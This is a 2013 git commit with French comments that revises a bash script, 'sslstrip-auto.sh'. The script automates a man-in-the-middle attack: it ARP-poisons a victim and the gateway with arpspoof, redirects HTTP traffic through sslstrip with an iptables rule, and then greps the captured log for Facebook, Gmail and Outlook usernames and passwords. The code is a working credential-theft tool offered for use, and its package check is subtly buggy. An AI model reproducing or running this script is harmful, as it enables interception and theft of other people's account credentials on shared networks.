269358415cebaa69f48d347849c80d54983ec48a
remy <remy@hostmint.(none)>
2013-02-27 21:06:34 +0100

    Les dépendances package sslstrip et python sont à installer par l'utilisateur (plus d'installation auto pour le moment) Ajout de nouvelles fonctions afin de supprimer du code superflux Supression précise de la règle iptable

--- sslstrip-auto.sh
+++ sslstrip-auto.sh
@@ -1,6 +1,5 @@
-#!/bin/bash -x
+#!/bin/bash 
 clear
-sortie="0"
 #set -eux
 
 #--------------Début verification que l'utilisateur est root-------------
@@ -13,78 +12,37 @@ if [ $check_root -eq 0 ]
 		sleep 3
 		exit
 fi
-#---------------Fin verification utilisateur root------------------------
-
-#---------------Fonctions vérification des réponses oui-non-------------
-answer_check() {
-	force=0
-	while [ $force -eq 0 ]
-		do
-#			clear
-			echo "La saisie est incorrecte, veuillez entre oui ou non"
-			read rep
-				if [ "x$rep" != "xoui" ] || [ "x$rep" != "xnon" ]
-					then
-						clear
-					else
-						force=1
-				fi
-		done
-}
+#---------------Fin verification utilisateur root---------------------
 			
-
-
 #----------------Verification des package installé-----------------------
 #sslstrip
 test=`echo $?`
 echo "Vérification des packages:"
-paquet_ssl=$(aptitude show sslstrip)
-#paquet_sslc=$(aptitude show sslstrip | grep install | awk '{print $2}' | head -n 1)
-if [ "$test" -ne "0" ]
+aptitude show sslstrip | head -n 2 | grep install 1> /dev/null
+if [ `echo $?` -ne 0 ]
 	then 
-		echo "sslstrip doit-être installé, voulez vous continuer (oui-non)?"
-		read rep
-		if [ "x$rep" = "xoui" ]
-			then
-				apt-get install sslstrip
-			elif [ "x$rep" = "xnon" ]
-				then
-					clear
-					echo "Le programme va s'arrêter"
-					sleep 3
-					exit	
-			else
-				answer_check
-				sslstrip
-				echo "sslstrip ok"
-				sleep 2
-		fi
+		clear
+		echo "sslstrip doit-être installé (aptitude install sslstrip ;) )"
+		echo " "
+		echo "le programme va se terminer"
+		sleep 3
+		exit
 	else
 		echo "sslstrip installé"
-fi
+	fi
 #arpspoof
-paquet_dsniff=$(aptitude show dsniff)
-
-if [ "$test" -ne "0" ]
+aptitude show sslstrip | head -n 2 | grep install 1> /dev/null
+if [ `echo $?` -ne 0 ]
 	then 
-		echo "arpspoof doit-être installé, voulez vous continuer (oui-non)?"
-		read rep
-		if [ "x$rep" = "xoui" ]
-			then
-				apt-get install dsniff
-			elif [ "x$rep" == "xnon" ]
-				then
-					clear
-					echo "Le programme va s'arrêter"
-					sleep 3
-					exit
-			else
-				answer_check
-			
-		fi
+		clear
+		echo "arpspoof doit-être installé, (aptitude install dsniff ;) )"
+		echo " "
+		echo "le programme va se terminer"
+		sleep 3
+		exit
 	else
 		echo "arpspoof installé"
-		sleep 2
+		
 fi
 #------------------------Fin de la verification des package necessaire---------------------- 
 
@@ -97,23 +55,29 @@ status() {
 	if [ -z $ctrl_sslstrip ]
 		then
 			sslstat="sslstrip OFF"
+			vssl=0
 		else
 			sslstat="sslstrip ON PID: $ctrl_sslstrip" 
+			vssl=1
 	fi
 	
 	ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 10 | grep -vi "grep"  | awk '{print $2}')
 	if [ -z $ctrl_arpspoof ]
 		then 
 			arpstat="arpspoof OFF"
+			varp=0
 		else
 			arpstat="arpspoof ON PID: $ctrl_arpspoof"
+			varp=1
 	fi
 	ctrl_iptable=$(iptables -t nat -L | grep "REDIRECT" | grep "dpt:http" | awk '{print $1}')
 	if [ -z $ctrl_iptable ]
 		then
 			iptablestat="iptables OFF"
+			vip=0
 		else
 			iptablestat="iptables ON"
+			vip=1
 	fi
 	clear		
 	echo $sslstat
@@ -123,11 +87,25 @@ status() {
 
 }
 
+
+iptab(){
+iptr=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep "$1")
+iptd=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep "$1" | awk '{print $1}')
+}
+
+
+ctrl(){
+ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')
+ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
+}
+
 #----------------------------------Check terminé début du programme-----------------------------------
+sortie=0
 while [ $sortie -eq "0" ]
-	do
-	#	clear        
+	do      
 		status
+		iptab
+		echo $iptr
 		echo " "
 		echo " "
 		echo "===========================MENU==========================="
@@ -139,8 +117,7 @@ while [ $sortie -eq "0" ]
 		read choix
 		case $choix in
 			"1")
-				ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')
-				ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
+				ctrl
 				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ] # si arpspoof et sslstrip ne sont pas lancés alors..
 					then
 			        		clear
@@ -159,7 +136,8 @@ while [ $sortie -eq "0" ]
 						echo 1 > /proc/sys/net/ipv4/ip_forward &
 						##mise en place de l'écoute en local
 						sslstrip -w sslstrip.log -a -l $port -f 2> /dev/null &
-						iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port &
+						iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 
+						iptab $port
 						##empoisonnement de cache ARP
 						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
 						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
@@ -174,8 +152,7 @@ while [ $sortie -eq "0" ]
 					;;
 			"2")
 				clear
-				ctrl_sslstrip=$(ps aux | grep -i "sslstrip -w" | head -n 1 | grep -vi grep |awk '{print $2}')
-				ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi grep |awk '{print $2}')
+				ctrl
 				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ]
 					then
 						clear
@@ -185,17 +162,8 @@ while [ $sortie -eq "0" ]
 						then 
 							clear
 							killall arpspoof
-							iptables -t nat -F
+							iptables -t nat -D PREROUTING $iptd
 							echo "arpspoof: arrêt en cours, veuillez patienter"
-					 		echo "10s"
-					 		sleep 2
-				 			echo "8s"
-					 		sleep 2
-					 		echo "6s"
-					 		sleep 2
-					 		echo "4s"
-					 		sleep 2
-				 			echo "2s"
 					 		sleep 2
 					 		clear
 					 		echo "\033[0;32mAttaque Stoppée\033[0m"
@@ -205,17 +173,8 @@ while [ $sortie -eq "0" ]
 						then
 							clear
 					 		killall sslstrip
-					 		iptables -t nat -F
+					 		iptables -t nat -D PREROUTING $iptd					
 					 		echo "sslstrip: arrêt en cours, veuillez patienter"
-					 		echo "10s"
-					 		sleep 2
-					 		echo "8s"
-					 		sleep 2
-					 		echo "6s"
-					 		sleep 2
-					 		echo "4s"
-					 		sleep 2
-					 		echo "2s"
 					 		sleep 2
 					 		clear
 					 		echo "\033[0;32mAttaque Stoppée\033[0m"
@@ -224,18 +183,9 @@ while [ $sortie -eq "0" ]
 						clear
 						killall arpspoof
 						killall sslstrip
-						iptables -t nat -F
+						iptables -t nat -D PREROUTING $iptd 
 						echo " arpspoof & ssltrip: arrêt en cours, veuillez patienter"
-						echo "10s"
-						sleep 2   
-						echo "8s" 
-						sleep 2   
-						echo "6s"
 						sleep 2  
-	                                        echo "4s"
-	                                        sleep 2  
-	                                        echo "2s"
-		                                sleep 2  
 		                                clear    
 		                                echo "\033[0;32mAttaque Stoppée\033[0m"
 		                                sleep 2
@@ -245,24 +195,9 @@ while [ $sortie -eq "0" ]
 				;;
 			"3")
 				clear
-				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ]
-					then
-						#kill $ctrl_sslstrip
-						#kill $ctrl_arpspoof
-						killall sslstrip
-						killall arpspoof
-						iptables -t nat -F
-					elif  [ -z $ctrl_sslstrip ]
-						then
-							kill $ctrl_arpspoof
-							iptables -t nat -F
-					elif [ -z $ctrl_arpspoof ]
-						then	
-							kill $ctrl_sslstrip
-							iptables -t nat -F
-					else
-					iptables -t nat -F
-				fi
+				iptables -t nat -D PREROUTING $iptd
+				killall arpspoof
+				killall sslstrip
 				echo "Le programme est en cours d'arrêt"
 				sortie="1"                              
 				;;                                                                  
@@ -302,9 +237,6 @@ while [ $sortie -eq "0" ]
 #-------------------------------------Test sur le fichier termine-------------------------------------
 
 #-------------------------------------Verification des information de comptes-------------------------
-
-					#facebook total: facebook_login=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*email=\([^&]*\).*pass=\([^&]*\).*/login=\1 pass=\2/')
-
 					facebook_login=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*email=\([^&]*\).*/\1/') #recup du login
 					facebook_pass=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*pass=\([^&]*\).*/\1/')
 
@@ -313,8 +245,7 @@ while [ $sortie -eq "0" ]
 							checkfb=1
 						else
 							checkfb=0
-						fi
-
+					fi
 
 					gmail_login=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
 					gmail_pass=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')
@@ -326,7 +257,6 @@ while [ $sortie -eq "0" ]
                						 checkgm=0
 						fi
 
-#outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^&]*\).*/\1/'| sed 's/\%40/\@/g')
 					outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
 					outlook_pass=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')
 
@@ -335,10 +265,8 @@ while [ $sortie -eq "0" ]
 					                checkou=1
 						else
 							checkou=0
-					fi
-                                                
+					fi                                            
 #--------------------------------------------AFFICHAGE----------------------------------------------                                                                                
-
 					if [ $checkfb -eq 0 ]
 						then
 							echo "Des informations de connexions FACEBOOK ont été trouvées!"
